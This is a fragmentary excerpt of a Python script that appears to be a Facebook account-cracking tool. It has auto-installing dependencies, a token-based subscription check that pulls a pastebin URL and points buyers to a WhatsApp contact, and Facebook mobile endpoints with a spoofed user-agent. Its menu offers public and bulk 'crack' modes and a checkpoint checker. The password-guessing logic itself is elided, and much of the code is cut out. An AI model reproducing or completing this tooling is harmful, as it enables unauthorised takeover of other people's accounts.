...
try:
    ...
    print('\n [脳] requests module not installed!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [脳] Futures module not installed!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [脳] Bs4 module not installed!...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64
from concurrent.futures import ThreadPoolExecutor as Worldwide
...
def xoshnaw():
  ...
  print("\x1b[1;92m ----------------------------------------------------------------------------------");time.sleep (0.03)
  print("\x1b[1;92m Your Subscription No Allow   \033[1;97m")
  print("\x1b[1;92m Your Token : "+id)
  print("\x1b[1;92m Copy Your Token And Press Enter to Send To The Owner")
  print("\x1b[1;92m CHECKING SERVER.........                                                  ");time.sleep (0.03)
  print("\x1b[1;92m  UNLOCK ULTIMATE                                                   ");time.sleep (0.03)
  print("\x1b[1;92m -----------------------------------------------------------------------------------");time.sleep (0.03)
  try:
    ...
    if id in httpCaht:
      ...
      print("\x1b[1;91mID ACTIVATE (WHATSAPP) INBOX  @OKENWA BRIGHT")
...
ct = datetime.now()
n = ct.month
bulan = ["JAN 1", "FEB 2", "MAR 3", "APR 4", "MAY 5", "JUN 6", "JUL 7", "AUG8 ", "SEP 9", "OCT 10", "NOV 11", "DEC 12"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
...
user = []
loop = 0
url_lookup = "https://findfb.id/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

try:
    rq = requests.get('https://pastebin.com/raw/HgWWdDYG').text
...
def menu(my_name,my_id,my_birthday):
	...
	io = '[01] Crack From Friendship Public\n[02] Crack From Friendship Public (Bulk)\n[03] Check Result Crack\n[04] Check Option Checkpoint\n[00] Log Out'
